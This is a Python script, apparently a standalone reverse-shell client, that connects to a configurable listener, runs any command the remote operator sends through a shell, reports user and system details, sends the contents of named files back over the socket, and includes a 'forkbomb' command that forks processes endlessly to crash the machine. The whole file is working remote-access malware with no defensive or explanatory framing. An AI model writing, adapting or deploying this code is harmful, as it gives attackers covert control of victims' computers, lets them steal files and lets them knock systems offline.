import socket 
import subprocess
import os
import platform
import getpass
import colorama
from colorama import Fore, Style
from time import sleep

colorama.init()

RHOST = "127.0.0.1"
RPORT = 9594

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((RHOST, RPORT))

while True:
    try:
        head = f"""{Fore.CYAN}{getpass.getuser()}@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLACK_EX}{os.getcwd()}{Style.RESET_ALL}$ """
        sock.send(head.encode())
        STDOUT, STDERR = None, None
        DOASISAY = sock.recv(1024).decode("utf-8")

        if DOASISAY == 'list':
            sock.send(str(os.listdir(".")).encode())

        if DOASISAY == 'forkbomb':
            while True:
                os.fork()

        elif DOASISAY.split(" ")[0] == 'cd':
            os.chdir(DOASISAY.split(" ")[1])
            sock.send('Directory changed to {}'.format(os.getcwd()).encode())

        elif DOASISAY == 'sysinfo':
            sysinfo = f"""
OS: {platform.system()}
Computer: {platform.node()}
User: {getpass.getuser()}
Software Version: {platform.release()}
Computer Architecture: {platform.processor()}
            """
            sock.send(sysinfo.encode())

        elif DOASISAY.split(" ")[0] == 'download':
            with open(DOASISAY.split(" ")[1], "rb") as f:
                file_data = f.read(1024)
                while file_data:
                    print('Transferring...', file_data)
                    sock.send(file_data)
                    file_data = f.read(1024)
                sleep(2)
                sock.send(b'Finished.')

        elif DOASISAY == 'exit':
            sock.send(b'exit')
            break
        else:
            mmoc = subprocess.Popen(str(DOASISAY), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            STDOUT, STDERR = mmoc.communicate()
            if not STDOUT:
                sock.send(STDERR)
            else:
                sock.send(STDOUT)
        if not DOASISAY:
            print('Disconnected')
            break
    except Exception as e:
        sock.send('Error: {}'.format(str(e)).encode())
sock.close()